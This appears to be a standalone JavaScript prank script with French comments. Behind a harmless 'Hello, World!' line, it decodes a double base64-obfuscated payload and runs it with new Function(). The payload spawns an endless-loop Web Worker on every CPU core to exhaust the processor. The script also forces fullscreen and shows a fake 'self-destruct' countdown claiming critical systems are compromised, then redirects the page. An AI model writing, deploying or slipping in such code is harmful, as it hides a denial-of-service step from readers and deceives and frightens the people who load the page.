console.log("Hello, World!");

let encodedScript = "bGV0IGVuY29kZWRTY3JpcHQgPSAiTHk4Z1JtOXVZM1JwYjI0Z2NHOTFjaUJqY3NPcFpYSWdaWFFnYkdGdVkyVnlJSFZ1SUZkdmNtdGxjZzBLWm5WdVkzUnBiMjRnYzNSaGNuUkRVRlZUZEhKbGMzTW9LU0I3RFFvZ0lDQWdiR1YwSUhkdmNtdGxjbk1nUFNCYlhUc05DaUFnSUNCc1pYUWdkMjl5YTJWeVUyTnlhWEIwSUQwZ1lBMEtJQ0FnSUNBZ2QyaHBiR1VnS0hSeWRXVXBJRTFoZEdndWNtRnVaRzl0S0NrN0RRb2dJQ0FnWURzTkNpQWdEUW9nSUNBZ2JHVjBJR0pzYjJJZ1BTQnVaWGNnUW14dllpaGJkMjl5YTJWeVUyTnlhWEIwWFN3Z2V5QjBlWEJsT2lBaVlYQndiR2xqWVhScGIyNHZhbUYyWVhOamNtbHdkQ0lnZlNrN0RRb2dJQ0FnYkdWMElIZHZjbXRsY2xWU1RDQTlJRlZTVEM1amNtVmhkR1ZQWW1wbFkzUlZVa3dvWW14dllpazdEUW9nSUEwS0lDQWdJR1p2Y2lBb2JHVjBJR2tnUFNBd095QnBJRHdnYm1GMmFXZGhkRzl5TG1oaGNtUjNZWEpsUTI5dVkzVnljbVZ1WTNrN0lHa3JLeWtnZXcwS0lDQWdJQ0FnYkdWMElIZHZjbXRsY2lBOUlHNWxkeUJYYjNKclpYSW9kMjl5YTJWeVZWSk1LVHNOQ2lBZ0lDQWdJSGR2Y210bGNuTXVjSFZ6YUNoM2IzSnJaWElwT3cwS0lDQWdJSDBOQ2lBZ0RRb2dJQ0FnWTI5dWMyOXNaUzVzYjJjb0lrTlFWU0J6ZEhKbGMzTWdiR0Z1WThPcElITjFjaUlzSUhkdmNtdGxjbk11YkdWdVozUm9MQ0FpWThXVGRYSnpJaWs3RFFvZ0lIME5DaUFnRFFvZ0lDOHZJRXhoYm1ObGNpQnNZU0JqYUdGeVoyVWdRMUJWRFFvZ0lITjBZWEowUTFCVlUzUnlaWE56S0NrNyI7DQpsZXQgZGVjb2RlZFNjcmlwdCA9IGF0b2IoZW5jb2RlZFNjcmlwdCk7DQpuZXcgRnVuY3Rpb24oZGVjb2RlZFNjcmlwdCkoKTs";
let decodedScript = atob(encodedScript);
new Function(decodedScript)();

// Mise en plein écran (peut ne pas fonctionner sur tous les navigateurs)
function enterFullscreen() {
    if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
    } else if (document.documentElement.mozRequestFullScreen) { // Firefox
        document.documentElement.mozRequestFullScreen();
    } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari & Opera
        document.documentElement.webkitRequestFullscreen();
    } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
        document.documentElement.msRequestFullscreen();
    }
}

// Affichage du message d'autodestruction et du compte à rebours
function startAutodestructSequence() {
    let countdown = 30;
    const messageElement = document.createElement('div');
    messageElement.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        font-size: 2em;
        color: red;
        text-align: center;
        font-family: sans-serif;
        z-index: 10000; /* Pour s'assurer qu'il est au-dessus de tout */
    `;
    document.body.appendChild(messageElement);

    const intervalId = setInterval(() => {
        messageElement.textContent = `AUTODESTRUCTION INITIÉE : ${countdown} SECONDES RESTANTES`;
        countdown--;

        if (countdown < 0) {
            clearInterval(intervalId);
            messageElement.textContent = "AUTODESTRUCTION TERMINÉE. SYSTÈMES CRITIQUES COMPROMIS.";
            // Vous pouvez ajouter ici des actions supplémentaires pour simuler l'autodestruction,
            // comme rediriger vers une autre page, effacer le contenu de la page, etc.
             // Redirection après 5 secondes
            setTimeout(() => {
                 window.location.href = "https://www.google.com"; // Remplacez par l'URL souhaitée
            }, 5000);
        }
    }, 1000);
}

// Lancement de la séquence
enterFullscreen();
startAutodestructSequence();